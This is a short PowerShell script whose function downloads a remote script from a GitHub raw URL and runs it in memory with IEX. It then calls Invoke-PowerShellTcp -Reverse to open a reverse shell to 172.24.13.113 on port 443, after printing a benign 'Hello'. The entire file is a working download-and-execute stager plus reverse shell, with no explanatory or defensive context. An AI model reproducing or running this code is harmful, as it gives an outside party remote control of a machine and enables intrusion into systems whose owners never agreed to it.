function RunThis(){
$wc = New-Object system.Net.Webclient
IEX $wc.downloadstring("https://raw.githubusercontent.com/c00dex2022/testonboard/main/Invoke-pst.ps1")
Invoke-PowerShellTcp -Reverse -IPAddress 172.24.13.113 -Port 443
}

write-host "Hello"
RunThis
